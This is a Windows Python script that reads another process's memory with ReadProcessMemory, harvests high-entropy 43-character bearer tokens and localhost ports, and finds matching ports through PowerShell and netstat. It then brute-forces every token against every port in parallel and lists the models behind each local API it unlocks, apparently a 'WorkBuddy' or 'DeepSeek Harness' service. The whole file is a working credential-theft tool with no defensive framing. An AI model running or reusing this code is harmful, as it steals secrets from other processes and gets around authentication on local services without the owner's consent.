# -*- coding: utf-8 -*-
import ctypes, ctypes.wintypes as w, re, sys, json, subprocess, math, http.client, os
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

PID = int(sys.argv[1]) if len(sys.argv) > 1 else 9444
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
PROCESS_VM_READ = 0x0010
MEM_COMMIT = 0x1000
MEM_PRIVATE = 0x20000
MEM_MAPPED = 0x40000
PAGE_GUARD = 0x100
PAGE_NOACCESS = 0x01
READABLE = {0x02, 0x04, 0x08, 0x20, 0x40, 0x80}

class MBI64(ctypes.Structure):
    _fields_ = [
        ('BaseAddress', ctypes.c_ulonglong),
        ('AllocationBase', ctypes.c_ulonglong),
        ('AllocationProtect', w.DWORD),
        ('__alignment1', w.DWORD),
        ('RegionSize', ctypes.c_ulonglong),
        ('State', w.DWORD),
        ('Protect', w.DWORD),
        ('Type', w.DWORD),
        ('__alignment2', w.DWORD),
    ]

k32 = ctypes.WinDLL('kernel32', use_last_error=True)
k32.OpenProcess.argtypes = [w.DWORD, w.BOOL, w.DWORD]
k32.OpenProcess.restype = w.HANDLE
k32.VirtualQueryEx.argtypes = [w.HANDLE, ctypes.c_void_p, ctypes.POINTER(MBI64), ctypes.c_size_t]
k32.VirtualQueryEx.restype = ctypes.c_size_t
k32.ReadProcessMemory.argtypes = [w.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
k32.ReadProcessMemory.restype = w.BOOL
k32.CloseHandle.argtypes = [w.HANDLE]

url_re = re.compile(r'http://127\.0\.0\.1:(\d{2,5})(?:/v1)?')
token_re = re.compile(r'(?<![A-Za-z0-9_-])([A-Za-z0-9_-]{43})(?![A-Za-z0-9_-])')
ports = set()
general = set()
priority = set()
regions = 0
bytes_scanned = 0

def entropy(s):
    n = len(s)
    if n == 0: return 0
    return -sum((c / n) * math.log2(c / n) for c in Counter(s).values())

def classes(s):
    return sum([
        any(c.islower() for c in s),
        any(c.isupper() for c in s),
        any(c.isdigit() for c in s),
        any(c in '-_' for c in s),
    ])

def add_text(s):
    global ports, general, priority
    for m in url_re.finditer(s):
        try: ports.add(int(m.group(1)))
        except Exception: pass
    low = s.lower()
    interesting = 'workbuddy' in low or 'dsh-connect-workbuddy' in low or 'shared_secret' in low or 'shim' in low
    for m in token_re.finditer(s):
        t = m.group(1)
        if len(t) != 43 or entropy(t) < 3.2 or classes(t) < 3: continue
        general.add(t)
        if interesting: priority.add(t)

def scan(handle):
    global regions, bytes_scanned
    addr = 0x10000
    max_addr = 0x7FFFFFFFFFFF
    max_bytes = 1400 * 1024 * 1024
    while addr < max_addr and regions < 20000 and bytes_scanned < max_bytes:
        mbi = MBI64()
        r = k32.VirtualQueryEx(handle, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(mbi))
        if not r: break
        base = int(mbi.BaseAddress)
        size = int(mbi.RegionSize)
        if size <= 0: break
        protect = int(mbi.Protect)
        typ = int(mbi.Type)
        state = int(mbi.State)
        if state == MEM_COMMIT and (protect & PAGE_GUARD) == 0 and (protect & 0xff) in READABLE and typ in (0, MEM_PRIVATE, MEM_MAPPED):
            to_read = min(size, max_bytes - bytes_scanned)
            off = 0
            while off < to_read and bytes_scanned < max_bytes:
                chunk = min(8 * 1024 * 1024, to_read - off)
                if chunk <= 0: break
                buf = ctypes.create_string_buffer(chunk)
                read = ctypes.c_size_t(0)
                ok = k32.ReadProcessMemory(handle, ctypes.c_void_p(base + off), ctypes.cast(buf, ctypes.c_void_p), chunk, ctypes.byref(read))
                if ok and read.value:
                    data = buf.raw[:read.value]
                    add_text(data.decode('latin1', 'ignore'))
                    add_text(data.decode('utf-16le', 'ignore'))
                    add_text(data[1:].decode('utf-16le', 'ignore'))
                    bytes_scanned += int(read.value)
                off += chunk
        addr = base + size
        regions += 1

def get_pids():
    pids = {PID}
    try:
        ps = subprocess.check_output(['powershell', '-NoProfile', '-Command', 'Get-CimInstance Win32_Process | Where-Object { $_.Name -match "DeepSeek Harness|WorkBuddy" } | ForEach-Object { $_.ProcessId }'], text=True, errors='ignore')
        for line in ps.splitlines():
            line = line.strip()
            if line.isdigit(): pids.add(int(line))
    except Exception:
        pass
    return pids

def netstat_ports(pids):
    try:
        raw = subprocess.check_output(['netstat', '-ano', '-p', 'TCP'], text=True, errors='ignore')
        for line in raw.splitlines():
            if 'LISTENING' not in line or '127.0.0.1:' not in line: continue
            parts = line.split()
            if len(parts) < 5: continue
            m = re.search(r'127\.0\.0\.1:(\d+)', parts[1])
            if not m: continue
            try: pid = int(parts[-1])
            except Exception: continue
            if pid in pids: ports.add(int(m.group(1)))
    except Exception:
        pass

def test(pair):
    port, token = pair
    try:
        conn = http.client.HTTPConnection('127.0.0.1', port, timeout=0.35)
        conn.request('GET', '/healthz', headers={'Authorization': 'Bearer ' + token, 'Accept': 'application/json', 'Connection': 'close'})
        r = conn.getresponse()
        body = r.read(200).decode('utf-8', 'replace')
        status = r.status
        conn.close()
        if status == 200 and (('ok' in body.lower()) or ('status' in body.lower())):
            return {'port': port, 'token': token, 'health': body[:120]}
    except Exception:
        pass
    return None

def models_for(item):
    port, token = item['port'], item['token']
    try:
        conn = http.client.HTTPConnection('127.0.0.1', port, timeout=1.5)
        conn.request('GET', '/v1/models', headers={'Authorization': 'Bearer ' + token, 'Accept': 'application/json', 'Connection': 'close'})
        r = conn.getresponse()
        text = r.read(400000).decode('utf-8', 'replace')
        conn.close()
        j = json.loads(text)
        ids = [x.get('id') for x in j.get('data', []) if isinstance(x, dict) and x.get('id')]
        return {**item, 'modelsStatus': r.status, 'ids': ids, 'ownedBy': (j.get('data') or [{}])[0].get('owned_by') if j.get('data') else None}
    except Exception as e:
        return {**item, 'modelsStatus': 0, 'ids': [], 'error': type(e).__name__}

def main():
    handle = k32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, False, PID)
    if not handle:
        print(json.dumps({'error': 'OpenProcess failed', 'lastError': ctypes.get_last_error(), 'pid': PID}))
        return
    try:
        scan(handle)
    finally:
        k32.CloseHandle(handle)
    pids = get_pids()
    netstat_ports(pids)
    ordered_tokens = sorted(priority) + [t for t in sorted(general - priority)][:1400]
    ordered_tokens = list(dict.fromkeys(ordered_tokens))[:1600]
    port_list = sorted(p for p in ports if 1024 <= p <= 65535)[:120]
    pairs = [(p, t) for p in port_list for t in ordered_tokens][:40000]
    found = []
    seen = set()
    if pairs:
        with ThreadPoolExecutor(max_workers=96) as ex:
            futs = [ex.submit(test, pair) for pair in pairs]
            for f in as_completed(futs):
                item = f.result()
                if not item: continue
                k = (item['port'], item['token'])
                if k in seen: continue
                seen.add(k)
                found.append(item)
                if len(found) >= 40: break
    enriched = [models_for(x) for x in found]
    print(json.dumps({
        'pid': PID,
        'pids': sorted(pids),
        'regions': regions,
        'bytesScanned': bytes_scanned,
        'memoryPorts': sorted(ports)[:80],
        'testedPorts': port_list,
        'priorityTokens': len(priority),
        'generalTokens': len(general),
        'pairs': len(pairs),
        'discovered': enriched,
    }, ensure_ascii=False))

if __name__ == '__main__':
    main()
